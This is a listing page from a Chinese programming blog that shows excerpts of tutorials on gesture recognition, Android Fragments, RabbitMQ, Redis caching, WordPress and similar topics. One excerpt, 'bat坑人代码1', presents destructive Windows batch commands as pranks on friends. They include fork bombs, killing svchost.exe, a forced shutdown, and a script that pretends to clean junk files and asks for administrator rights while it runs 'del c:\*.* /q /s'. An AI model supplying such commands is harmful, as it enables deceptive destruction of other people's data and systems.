<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eeed57de405a39d256000b6c2726e8c3/" rel="bookmark">
			python&#43;opencv&#43;mediapipe&#43;tensorflow实现手势识别控制计算机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
系统介绍
OpenCV
Mediapipe
TensorFlow
PyWin32
数据处理
通过mediapipe提取特征
转化为相对坐标：
均值方差归一化（标准化）：
测试效果：
神经网络
网络结构设计
激活函数
神经网络的训练过程
模型调参
语音唤醒
监听麦克风
将音频读取为numpy
识别判断
系统设计
识别缓冲区
键鼠控制
PyWin32
识别区域的映射
鼠标操作
键盘操作
手势控制
计算旋转角度
调节亮度和音量
系统介绍 本系统灵感源自钢铁侠的贾维斯是基于手势识别的计算机交互系统，利用OpenCV、Mediapipe识别手部关键点；利用TensorFlow搭建神经网络，以识别不同的手势；利用PyWin32等库调用Windows api操作Windows系统。
OpenCV OpenCV是一个基于Apache2.0许可（开源）发行的跨平台计算机视觉和机器学习软件库，它轻量级而且高效——由一系列 C 函数和少量 C++ 类构成，提供了Python的接口，实现了图像处理和计算机视觉方面的很多通用算法。
这里用opencv实现调用摄像头，绘制图像等操作。
Mediapipe Mediapipe（下面简称mp）是Google的一个开源项目，可以提供开源的、跨平台的常用机器学习方案。mp实际上是一个集成的机器学习视觉算法的工具库，包含了人脸检测、人脸关键点、手势识别、头像分割和姿态识别等各种模型。
本系统中主要用到了mp中的手部关键点检测模型MediaPipe Hands。这是一个识别效果非常优秀的模型，手掌检测中实现了95.7%的平均精度。我认为了解Mediapipe Hand的实现原理，对机器学习和深度学习有很好的启发作用。在官网上了解到，首先，mp训练的是手掌检测器而不是手部检测器，因为检测手掌和拳头等刚性物体的边界框比用关节手指检测手要简单得多。其次，由于手掌是较小的物体，因此非最大抑制算法即使在双手自遮挡的情况下（如握手）也能很好地工作。再次，可以使用方形边界框（机器学习术语中的锚点）对手掌进行建模，忽略其他纵横比，从而将锚点数量减少3-5倍。此外，编码器-解码器特征提取器用于更大的场景上下文感知，即使对于小对象也是如此（类似于RetinaNet方法）。
在整个图像上进行手掌检测后，mp随后的手部特征点模型通过回归对检测到的手部区域内的21个3D手关节坐标进行精确的关键点定位，即直接坐标预测。该模型学习一致的内部手部姿势表示，即使对部分可见的手和自我遮挡也能很好识别。
为了获得真实数据，mp手动标注了具有 21个3D坐标的 约3万张真实世界图像，如下所示（如果根据相应的坐标存在，mp从图像深度图中获取 Z 值）。为了更好地覆盖可能的手部姿势，并对手部几何体的性质提供额外的监督，mp还在各种背景上渲染高质量的合成手部模型，并将其映射到相应的3D坐标。
顶部：对齐的手部裁剪传递到追踪网络，并带有地面实况注释。底部：渲染的带有地面实况注释的合成手部图像。
TensorFlow TensorFlow由谷歌人工智能团队谷歌大脑（Google Brain）开发和维护，是一个基于数据流编程的符号数学系统，被广泛应用于各类机器学习算法的编程实现。我们主要用到的是tensorflow.keras。Keras是用于构建和训练深度学习模型的 TensorFlow 高阶 API。利用此 API，可实现快速原型设计、先进的研究和生产。
PyWin32 是一个针对Windows平台对Python做的扩展，包装了Windows 系统的 Win32 API，能创建和使用 COM 对象和图形窗口界面。系统通过pywin32调用win32api实现电脑键鼠的操作，调用win32gui实现对电脑窗口的操作。
数据处理 要实现多种手势的识别，首先想到的就是卷积神经网络，卷积神经网络需要的训练数据比较多，并且我们需要识别某些特定的手势，在网上并没有找到理想的公开数据集。
通过mediapipe提取特征 卷积神经网络中卷积层作用就是在图片中提取特征，最后将提取出的特征，交给全连接层做出预测。于是我想到，mediapipe可以用来识别手部关键点，使用mediapipe提取出手部的关键点坐标，把关键点作为特征，取代卷积层，直接让全连接层去处理这些关键点的坐标信息，就可以把问题简化，将卷积问题转换成回归问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eeed57de405a39d256000b6c2726e8c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f5696492cae6fa58144225cacbbf690/" rel="bookmark">
			Fragment全文详解(由浅入深_源码分析)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信android开发者们一定或多或少的用过Fragment，但是对于其更深层次的原理我猜可能大部分应该都没有了解过，今天这里就由浅入深，整体对Fragment做一个全面解析。
基础介绍 Fragment是什么以及为什么要有Fragment呢？ Fragment直译为碎片，是Android 3.0引入的组件，Fragment不能单独使用，必须要依赖于Activity。 Fragment引入之前几乎所有的逻辑都被放置在Activity中，使得Activity臃肿而混乱，Fragment作为一个微小的Activity诞生。
另外Fragment还有以下几个特点：
模块化：我们可以按照模块将代码写入到不同的Fragment中，之后在根据需要嵌入到Activity。可重用：多个Activiy可以复用同一个Fragment。适配性：根据不同的布局样式，组合不同的Fragment。 Fragment生命周期 Fragment作为管理一组View的组件，也是有自己的生命周期的，和Activity类似，但又不完全一样。基本生命周期如下图所以：
onAttach：在Fragment和Activity关联时调用，仅仅只调用一次。我们可以对传递给Fragment的参数进行解析。onCreate：Fragment创建时调用，仅调用一次。onCreateView：构建Fragment View的时候进行调用，返回Fragment要绘制布局的根视图。onActivityCreated：在Activity执行完成onCreate之后进行调用。onStart：Fragment对用户可见的时候进行调用。onResume：Fragment可以和用户交互的时候进行调用。onPause：Fragment对用户不可交互的时候进行调用。onStop：Fragment对用户不可见时进行调用。onDestroyView：Fragment需要移除视图时进行调用。onDestroy：Fragment自身销毁时进行调用。onDetach：Fragment和Activity解除关系时进行调用。 Fragment常用类以及方法解析 FragmentManager：通过getSupportFragmentManager函数获取，用来管理Activity中的Fragment。
FragmentTransaction：事务。可以通过FragmentManager调用beginTransaction()方法来开启一个事务。通过事务，我们可以对Fragment进行一系列的操作。如下：
add：添加一个Fragment到Activity中。
remove：从Activity中移除一个Fragment。如果Fragment没有被加入回退栈中，则该Fragment会进行销毁。
replace：用另一个Fragment替换当前的Fragment，本质上时先remove再add。
hide：隐藏当前的Fragment，设置为不可见，不会销毁，与之对应的是show。本质是对View进行调用了View.GONE。
show：显示之前隐藏的Fragment，与之对应的是hide。本质是对View进行调用了View.VISIBLE。
detach：将视图进行移除，但是并不销毁Fragment，Fragment依旧由FragmentManager进行管理。
addToBackStack：将Fragment加入返回栈。当移除或替换一个Fragment并向返回栈添加事务时，系统会停止（而非销毁）移除的Fragment。如果没有addToBackStack，则被替换的Fragment会直接进行销毁。
//示例，如果用户执行回退操作进行Fragment的恢复，被替换的Fragment将重新启动。 ft.replace(R.id.fl_content, LearnFragment()).addToBackStack(null).commitAllowingStateLoss() setMaxLifecycle：设定Fragment生命周期最高上限。如果设置的生命周期上限低于当前的生命周期上限，则会进行回退设定的生命周期。
比如，当前生命周期为RESUME，如果设置MaxLifecycle为START，则生命周期则会回到RESUME。
说一个例子，在调用hide和show函数的时候，Frgament的生命周期并不会进行变化。但是我就是想要在show的时候让Fragment走到RESUME呢？此时可以进行如下操作。
//hide ft.setMaxLifecycle(fragment,Lifecycle.State.STARTED).hide(fragment) //show ft.setMaxLifecycle(fragment,Lifecycle.State.RESUMED).show(fragment) commit/commitAllowingStateLoss：提交一个事务。commit如果状态丢失则会抛异常，commitAllowingStateLoss则不会。
源码流程分析 接下来站在源码角度对Fragment进行一波分析，看看Fragment是如何实现的。相信可以对Fragment有更深层次的认识。
我们需要添加一个Fragment到Activity中时，一般会进行如下操作：
val fragmentManager = getSupportFragmentManager() // 获取fragmentManager val ft = fragmentManager.beginTransaction() // 开启事务 ft.add(R.id.fl_content, LearnFragment(), tag) // 添加 ft.commitAllowingStateLoss() // 提交事务 我相信上面的代码，大家可能都非常熟悉了，接下来就根据上述代码，一步一步进行源码跟踪分析。
获取到FragmentManager。 getSupportFragmentManager()方法，在FragmentActivity类中。
FragmentActivity final FragmentController mFragments = FragmentController.createController(new HostCallbacks()); public FragmentManager getSupportFragmentManager() { //通过mFragments 获取了FragmentManager 而mFragments即为 FragmentController return mFragments.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f5696492cae6fa58144225cacbbf690/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86c401c33da60915a53f0acfc1164bdc/" rel="bookmark">
			python 中文显示乱码如何处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你好! 解决 Python 中文显示乱码的方法有以下几种:
在文件头添加如下代码: # -*- coding: utf-8 -*- 在文件头添加如下代码: #!/usr/bin/python # -*- coding: utf-8 -*- 使用 codecs 库: import codecs# 使用 codecs 打开文件 f = codecs.open('file.txt', 'r', 'utf-8') # 读取文件内容 data = f.read() # 关闭文件 f.close() 使用 sys 库和 setdefaultencoding 函数: import sys # 设置系统默认编码为 utf-8 reload(sys) sys.setdefaultencoding('utf-8') 注意: 在 Python 3 中, 不能再使用 sys.setdefaultencoding 函数设置编码, 会报错。
希望这些方法能帮到你!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f743e38b18a4b42c12443f45c3e4b198/" rel="bookmark">
			RabbitMQ消息确认
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 消息确认作用
2 开发示例
2.1 生产者确认
2.2 消费者确认
1. 消息确认作用 保证消息的可靠性主要依靠三种机制：一个是消息的持久化，一个是事务机制，一个就是消息的确认机制。
1）消息持久化
消息持久化是将消息写入本地文件，如果rabbitmq故障退出，在重启时会从本地文件系统读取队列数据。
2）事务机制
rabbitmq的事务机制提供了消息生产者和消息服务器（broker）之间的事务的开启，提交，回滚操作（如下图所示）。这套机制可以保证消息可靠性，但也有缺点：由于使用事务机制会导致消息生产者和broker（服务器）交互次数增加，造成性能的浪费，且事务机制是阻塞的，在发送一条消息后需要等待RabbitMQ回应，获取回应后才能发送下一条消息，因此事务机制并不提倡使用（RabbitMQ事务模式与非事务模式在性能上相差可达高达上百倍，具体数值因机器性能和网络环境而不同，但差异都会非常明显）
事务提交流程：
客户端向服务器请求开启事务（tx.select）服务器端返回响应接收开启事务（tx.select-ok）推送消息客户端请求提交事务（tx.commit）服务器提交事务返回响应（tx.commit-ok） 3）消息确认
消息确认分为：发送者确认，接收方确认。 发送者确认分为：消息到达交换机确认，消息到达与交换机绑定的队列确认。
2 开发示例 用于示例开发基础代码：
git clone -b rabbitmqDemo git@gitee.com:heizifeng/rabbit-mqdemo.git 2.1 生产者确认 因为：每个RabbitTemplate实例只能注册一个ConfirmCallback，所以如果启动web容器并多次调用该方法进行消息发送，则会报异常。（测试用例可以通过，是因为每次测试执行完毕后容器就终止，下次运行时是新的容器）
增加RabbitTemplate的配置类，在配置类中指定消息确认回调方法：
package com.zking.rabbitmqdemo.provied.config; import lombok.extern.slf4j.Slf4j; import org.springframework.amqp.rabbit.connection.ConnectionFactory; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; /** * * @site www.xiaomage.com * @company xxx公司 * @create 2021-11-14 10:04 */ @Configuration @Slf4j public class RabbitTemplateConfig { @Bean public RabbitTemplate createRabbitTemplate(ConnectionFactory connectionFactory) { RabbitTemplate template = new RabbitTemplate(connectionFactory); template.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f743e38b18a4b42c12443f45c3e4b198/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0edb4f6776a874ca60e08d869e55524e/" rel="bookmark">
			bat坑人代码1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.无限弹窗
start cmd %0 整蛊度：⭐⭐⭐⭐ 伤害度⭐⭐⭐
此文件为.bat后缀名文件运行！
会弹出大量cmd窗口 直到卡死机
原理：start 运行某程序或文件
%0 循环
2.直接蓝屏
taskkill -f -im svchost.exe 整蛊度：⭐⭐⭐⭐ 伤害度0
此文件为.bat后缀名文件运行！
运行效果：二话不说，直接蓝屏
原理：结束Windows关键进程
3.定时关机
@echo off shutdown -s -t 30 "30秒后电脑即将自毁!" 30是定时关机的秒数，双引号内文字可改
整蛊度：⭐⭐ 伤害度0
先让朋友保存一下文件，不然别怪朋友打你
此文件为.bat后缀名文件运行！编码为ANSI，在另存为的时候改一下
警告！！！⚠下面是有危险的代码！不建议实体机运行！！！！！！！！！！
运行后电脑损坏不关本作者任何关系！！！！！！！⚠⚠⚠
4.删除系统盘所有文件
整蛊度：⭐⭐⭐⭐⭐⭐​​​​​​​⭐⭐伤害度⭐⭐⭐⭐⭐⭐⭐⭐
@echo off echo 正在清理系统盘...清理垃圾中，千万不要关闭此窗口以及必须要用管理员运行！不用管理员可能会导致清理失败！！！ pause echo 请确认是管理员运行！！！ pause echo 正在清理中...请勿关闭此窗口 del c:\*.* /q /s shutdown -r 运行效果：删除系统后直接重启，然后整蛊对象就会神奇的发现：开不开机了！
文字也可以改改
5.进程爆炸
%0|%0 运行效果：这段代码会在运行时创建大量的进程，变得很卡
整蛊度：⭐⭐⭐⭐​​​​​​​⭐伤害度⭐⭐⭐⭐⭐
知识点 shutdown
用法: shutdown [/i | /l | /s | /sg | /r | /g | /a | /p | /h | /e | /o] [/hybrid] [/soft] [/fw] [/f]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0edb4f6776a874ca60e08d869e55524e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/855c46b9e8fbfe58b21e219e4dc9213b/" rel="bookmark">
			Word 排版：插入题注
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了节省排版时间，最好的方法就是将文档中的图片和表格同一插入题注并引用，这样子在删除和修改某个表格或者图标之后，只需要 更新域 就可以了。
插入题注 选中一张图片或一个表格，点击右键，选择添加题注。
图片的【标签】一般选择图;【位置】选择所选项目下方
还可以为图片添加包含章节编号的题注。例如，当前文档属于第1章节，想将图片按照：图1-1、图1-2”的含章编号的格式进行编号。点击【编号】可对编号格式进行设置，如添加章节编号
之后会在指定位置出现图片标号，可自行在标号后输入具体的图片名称
表格添加类似（也可提前输入图/表名称）：
点击确定后，会在表格上方出现包含具体表名的题注
图片删除或移位后快速更新编号 图片自动编号之后，如果对图片、表格、公式等进行了删除或位置进行了调整，图片的编号信息（题注）却不会被自动更新。
此时，我们可按下“Ctrl+A”键全选文档，再按【F9】手动更新域，你会发现图片题注编号会按照顺序自动更新。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a1ffd9eb39f21f98b8988a7dcabc751/" rel="bookmark">
			IMX6ULL学习笔记（14）——GPIO接口使用（C语言方式）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、GPIO简介 i.MX6ULL 芯片的 GPIO 被分成 5 组,并且每组 GPIO 的数量不尽相同，例如 GPIO1 拥有 32 个引脚， GPIO2 拥有 22 个引脚， 其他 GPIO 分组的数量以及每个 GPIO 的功能请参考 《i.MX 6UltraLite Applications Processor Reference Manual》 第26章General Purpose Input/Output (GPIO)（P1133）。
通过 GPIO 硬件结构框图，就可以从整体上深入了解 GPIO 外设及它的各种应用模式。
1.1 IO命名 打开 i.MX6ULL 参考手册的第 32 章“Chapter 32: IOMUX Controller(IOMUXC)”
i.MX6ULL 的 IO 分为两类：SNVS 域的和通用的，这两类 IO 本质上都是一样的。
“IOMUXC_SW_MUX_CTL_PAD_GPIO1_IO00”的就是 GPIO 命名，命名形式就是“IOMUXC_SW_MUC_CTL_PAD_XX_XX”，后面的“XX_XX”就是 GPIO 命名，比如：GPIO1_IO01、UART1_TX_DATA、JTAG_MOD 等等。他是 根据某个 IO 所拥有的功能来命名的。比如我们一看到 GPIO1_IO01 就知道这个肯定能做 GPIO，看到 UART1_TX_DATA 肯定就知道这个 IO 肯定能做为 UART1 的发送引脚。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a1ffd9eb39f21f98b8988a7dcabc751/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5ca15093144d1fca2095e58ebabc77b/" rel="bookmark">
			C语言及算法设计课程实验二：数据类型、运算符和简单的输入输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言及算法设计课程实验二：数据类型、运算符和简单的输入输出 一、实验目的二、实验内容2.1、输入并运行教材第3章第4题给出的程序：2.2、输入第3章第5题的程序2.3、输入以下程序：2.4、程序设计题：假如我国国民生产总值的年增长率为9%,计算10年后我国国民生产总值与现在相比增长多少百分比。编写程序。 三、实验步骤3.1、数据类型、运算符和简单的输入输出实验题目1：输入并运行教材第3章第4题给出的程序：3.2、数据类型、运算符和简单的输入输出实验题目2：输入第3章第5题的程序3.3、数据类型、运算符和简单的输入输出实验题目3：输入以下程序：3.4、数据类型、运算符和简单的输入输出实验题目4：程序设计题：假如我国国民生产总值的年增长率为9%,计算10年后我国国民生产总值与现在相比增长多少百分比。编写程序。3.4.1、编写程序3.4.1.1、for 循环方式计算百分比如下所示3.4.1.2、调用math函数方式计算百分比如下所示3.4.1.3、for 循环方式和调用math函数方式计算百分比形成综合程序如下所示 3.4.2、年利率改为输入方式3.4.3、在程序中增加printf函数语句四、实验总结五、实验完整程序5.1、数据类型、运算符和简单的输入输出实验题目1：输入并运行教材第3章第4题给出的程序的完整程序5.2、数据类型、运算符和简单的输入输出实验题目2：输入第3章第5题的程序的完整程序5.3、数据类型、运算符和简单的输入输出实验题目3：输入以下程序的完整程序5.4、数据类型、运算符和简单的输入输出实验题目4：程序设计题：假如我国国民生产总值的年增长率为9%,计算10年后我国国民生产总值与现在相比增长多少百分比。编写程序的完整程序 一、实验目的 (1) 掌握c语言数据类型，了解字符型数据和整型数据的内在关系。(2) 掌握对各种数值型数据的正确输入方法。(3) 学会使用C的有关算术运算符，以及包含这些运算符的表达式，特别是自加( + + )和自减(- -)运算符的使用。(4) 学会编写和运行简单的应用程序。(5) 进一步熟悉C程序的编辑、编译、连接和运行的过程。 二、实验内容 2.1、输入并运行教材第3章第4题给出的程序： (1) 输入并运行教材第3章第4题给出的程序如下所示：
#include &lt;stdio.h&gt; int main() { char cl, c2; cl = 97; c2 = 98; printf("%c %c\n"cl, c2); printf("%d %d\n", cl, c2); return 0; } ①运行以上程序，分析为什么会输出这些信息。
②如果将程序第4,5行改为
cl = 197; c2 = 198; 运行时会输出什么信息？为什么？
③如果将程序第3行改为 int cl,c2; 运行时会输出什么信息？为什么？
2.2、输入第3章第5题的程序 (2) 输入第3章第5题的程序。即：
用下面的 scanf 函数输入数据，使 a = 3, b = 7, x = 8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5ca15093144d1fca2095e58ebabc77b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3f15983a5696ad0c624ac70cbca321e/" rel="bookmark">
			修改jmeter内存配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在本机使用jmeter时会出现——在最后结束线程时总是接口报错的情况，这是由于你电脑给到jmeter的内存不足导致的
以下是教大家如何修改jmeter内存
右键进入编辑模式
将这一行修改为
set HEAP=-Xms1g -Xmx1g -XX:MaxMetaspaceSize=1024m 建议修改为1024就够了，按照你的需求来设置
然后报错即可
修改完成后重新启动jmeter
启动后在 D:\Program Files\Java\jdk1.8.0_211\bin\jconsole.exe 以管理员运行，不启动jmeter是没有 ApacheJMeter.jar 这个选项的
观察这里的是不是修改后的数字，是的话就代表成功了，不是，就重新打开编辑模式排查有没有报错，重启jmeter，再去看看jmeter监视和管理控制台的vm参数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25b20622dbe05a7fae68420fc12f472f/" rel="bookmark">
			Redis的缓存问题之缓存穿透、缓存雪崩、缓存击穿
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、什么是缓存穿透？
二、常见的解决方案有两种：
1、缓存空对象
2、布隆过滤
综上所述
三、编码解决商品查询的缓存穿透问题
四、缓存雪崩问题及解决思路
1、什么是缓存雪崩？
五、缓存击穿问题及解决思路
1、什么是缓存击穿？
2、解决方案（2种）
（1）互斥锁
（2）逻辑过期
3、互斥锁与逻辑过期的对比分析
六、利用互斥锁解决缓存击穿问题
代码实现
七、利用逻辑过期解决缓存击穿问题
需求描述
代码实现
八、封装 Redis 工具类
一、什么是缓存穿透？ 缓存穿透是指客户端请求的数据在缓存中和数据库中都不存在，这样缓存永远不会生效，这些请求都会打到数据库。
二、常见的解决方案有两种： 1、缓存空对象 简单的来说，就是请求之后，发现数据不存在，就将null值打入Redis中。
优点：实现简单，维护方便缺点： 额外的内存消耗可能造成短期的不一致 思路分析：
当我们客户端访问不存在的数据时，先请求 redis，但是此时 redis 中没有数据，此时会访问到数据库，但是数据库中也没有数据，这个数据穿透了缓存，直击数据库，我们都知道数据库能够承载的并发不如 redis 这么高，如果大量的请求同时过来访问这种不存在的数据，这些请求就都会访问到数据库，简单的解决方案就是哪怕这个数据在数据库中也不存在，我们也把这个数据存入到 redis 中去，这样，下次用户过来访问这个不存在的数据，那么在 redis 中也能找到这个数据就不会进入到数据库了。
2、布隆过滤 在客户端与Redis之间加了一个布隆过滤器，对于请求进行过滤。 布隆过滤器的大致的原理：布隆过滤器中存放二进制位。数据库的数据通过hash算法计算其hash值并存放到布隆过滤器中，之后判断数据是否存在的时候，就是判断该hash值是0还是1。
但是这个玩意是一种概率上的统计，当其判断不存在的时候就一定是不存在；当其判断存在的时候就不一定存在。所以有一定的穿透风险！！！
优点：内存占用较少，没有多余 key缺点： 实现复杂存在误判可能 综上所述 我们可以两种方案一起用，这样子最为保险。据统计使用布隆过滤器一般可以避免90%的无效请求。但是黑马程序员这里的视频是使用方案一（缓存空对象）。
三、编码解决商品查询的缓存穿透问题 核心思路如下：
在原来的逻辑中，我们如果发现这个数据在 mysql 中不存在，直接就返回 404 了，这样是会存在缓存穿透问题的
现在的逻辑中：如果这个数据不存在，我们不会返回 404 ，还是会把这个数据写入到 Redis 中，并且将 value 设置为空，欧当再次发起查询时，我们如果发现命中之后，判断这个 value 是否是 null，如果是 null，则是之前写入的数据，证明是缓存穿透数据，如果不是，则直接返回数据。
显然我们在这里只要做两件事：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25b20622dbe05a7fae68420fc12f472f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ddea7843fa919fdfe5ad198ed53c9ca/" rel="bookmark">
			宝塔面板部署WordPress(保姆式教程)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言： 通过本篇文章，您可以掌握：
1.基于宝塔面板的快速建站操作；
2.一些浅浅的建站知识与技能；
3.WordPress助您快速建站，节省您的时间；
如何联系我？
wei.haoran@outlook.com
正文： 1.在宝塔面板网站根目录创建文件夹： 注：本教程采用的是子目录部署WordPress，因此需要在根目录创建一个blog文件夹（文件名任意）,您亦可以将WordPress安装在您的网站根目录。
2.在文件夹内新增WordPress压缩包： 下载地址：下载 | WordPress.org China 简体中文
在您的文件夹内部（博主的子目录是blog）上传压缩包； 如图：
3.解压WordPress压缩包： 4.进入WordPress 文件夹内剪切粘贴： 现在，您需要进入解压好的WordPress文件夹内，选中所有文件和文件夹，将其剪切粘贴至您的blog文件夹内，即wordpress文件夹外部。
5.新建wordpress数据库： 为了方便后期的管理，避免与网站根目录冲突，博主选择新建一个数据库；
注意：博主选择了utf-8格式。
6.登录您的WordPress仪表盘： 博主在根目录下新建了blog子目录，又将WordPress部署在了子目录内；
因此，博主需要访问www.redamancy.website/blog
如果您将WordPress部署在了根目录，您可以输入您的域名或者ip地址进行访问。
第一次登录如图所示： 7.链接新建的数据库： 注意：
数据库主机和表前缀这里选择了默认;
数据库名和用户名就是您刚新建数据库的名字和用户名，密码也是。
8.进一步设置您的WordPress： 建议:
在您还未完善个人博客之前，并不推荐您不勾选对搜索引擎的可见性。
假如此时勾选，后期会影响您的网站排名。
您可以随时在WordPress设置中更该。
9.安装成功： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92345d25c6678afa9f48bff1d2ec9581/" rel="bookmark">
			vscode Vue文件代码显示不高亮问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我用vscode打开vue文件高亮显示不对
这些地方显示的都不对，经过搜索发现，打开vscode的设置json进行编辑
"files.associations": { "*.vue": "html" }, 加入这一行就可以解决这个问题。保存之后高亮就正常了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3224e50e32b95c89852c3c0ffd6fc1c2/" rel="bookmark">
			cadence 的常用快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cadence 是一款电子设计自动化 (EDA) 软件，用于设计、模拟和分析电子电路。它提供了大量的快捷键，可以帮助用户更快速、高效地使用软件。
以下是一些常用的快捷键：
Ctrl + S：保存当前工程Ctrl + Z：撤销Ctrl + Y：重做Ctrl + C：复制Ctrl + V：粘贴Ctrl + A：全选Ctrl + F：查找Ctrl + G：跳转到指定行Ctrl + O：打开文件Ctrl + P：打印Ctrl + N：新建文件Ctrl + W：关闭当前窗口Ctrl + Q：退出 cadenceCtrl + E：显示/隐藏属性编辑器Ctrl + R：显示/隐藏对象树Ctrl + T：显示/隐藏工具栏 这只是常用快捷键的一小部分，cadence 还有许多其他的快捷键，可以根据自己的需要来使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14d8a5f03bfcad3de83bddbc3a8a6674/" rel="bookmark">
			Canvas drawImage() 方法实现图片压缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图片压缩原理 1.CanvasRenderingContext2D.drawImage() 方法可以从页面 DOM 元素作为图像源来根据坐标和大小重新绘制该图像。
2.HTMLCanvasElement.toDataURL() 和 HTMLCanvasElement.toBlob() 方法支持导出为 base64 字符串或 Blob 对象。
CanvasRenderingContext2D.drawImage() drawImage(image, dx, dy) drawImage(image, dx, dy, dWidth, dHeight) drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight) image* 绘制到上下文的元素。允许任何的画布图像源，包括 canvas、img、svg、video 元素和 ImageBitmap 对象等。dx, dy, dWidth, dHeight* 这几个属性表示在 canvas 画布上指定一片区域用来放置图片，dx、dy 指定图片的左上角在 canvas 上的坐标，dWidth、dHeight 指定图片在 canvas 上绘制的区域宽高。如果没有指定 sx、sy、sWidth、sHeight 这4个参数，则图片会被拉伸或缩放在 canvas 区域内。sx, sy, swidth, sheight* 这几个属性是针对图片元素的，表示图片在 canvas 画布上显示的大小和位置。sx、sy 表示在图片上作为左上角的坐标，然后往右下角方向 swidth、sheight 尺寸范围作为最终在 canvas 上显示的图片内容。 图片压缩，需要使用的是 CanvasRenderingContext2D.drawImage() 5个参数的语法，即指定图片的左上角在 canvas 上的坐标为 0 0，图片在 canvas 上绘制的区域宽高为 canvas 的宽高。例如，图片的原始尺寸是 4000*3000，现在要把尺寸限制为 400*300 大小。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14d8a5f03bfcad3de83bddbc3a8a6674/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c69197f20cb849ad5ad3c5e26be96d1b/" rel="bookmark">
			JAVA面向对象创建一个水果类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		public class Fruitstore { //属性(成员变量) String Fruits; double price; //行为（成员方法） public void sellFruits(){ System.out.println("店面在卖水果"); } }
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
